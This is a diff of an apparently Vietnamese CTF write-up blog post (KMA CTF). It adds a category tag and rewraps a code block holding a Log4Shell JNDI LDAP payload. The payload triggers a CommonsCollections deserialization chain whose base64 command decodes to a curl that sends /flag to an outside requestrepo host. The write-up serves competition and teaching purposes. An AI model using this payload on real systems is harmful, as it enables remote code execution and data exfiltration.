@@ -1,5 +1,6 @@
 ---
 title: Writeup - KMA CTF lần 2
+categories: CTF
 tags: CTF
 toc: true
 ---
@@ -264,9 +265,12 @@ Mọi người thay IP VPS vào chỗ bị bôi bỏ
 :::
 
 Payload send để lấy flag
-```
-$\{jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==\}
-```
+{% highlight text %}
+{% raw %}
+${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==}
+{%  endraw %}
+{% endhighlight %}
+
 Trong đó: `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==` là `curl -d @/flag http://suql4mat.requestrepo.com`
 
 ![](https://i.imgur.com/s9eRtsA.png)
